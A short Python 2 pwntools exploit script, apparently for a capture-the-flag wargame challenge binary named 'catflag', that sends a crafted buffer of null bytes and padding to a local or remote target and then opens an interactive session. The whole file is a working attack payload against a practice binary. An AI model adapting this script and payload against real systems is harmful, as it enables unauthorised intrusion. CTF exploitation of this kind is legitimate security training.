from pwn import *
import struct
context(os='linux', arch='i386')

def getConn():
    return process('./catflag') if local else remote('chall05-pwn01.wargame.whitehat.vn', 28103)
local = True

r = getConn()

#gdb.attach(r, '''
#break *0x80486D7
#break *0x8048757
#break *0x8048704
#break *0x8048860
#break *0x80487fc
#break *0x8048839
#c
#''')


junk="\x46"*2+"\x46"*4
pl="\x00"*100+junk

#f=open('x','w')
#f.write(pl)
#f.close()
def pwn():
	try:
		print r.recv()
		r.sendline(pl)
		print r.recv(1024)
	except Exception, e:
		print "Err",e
pwn()
r.interactive()
r.close()

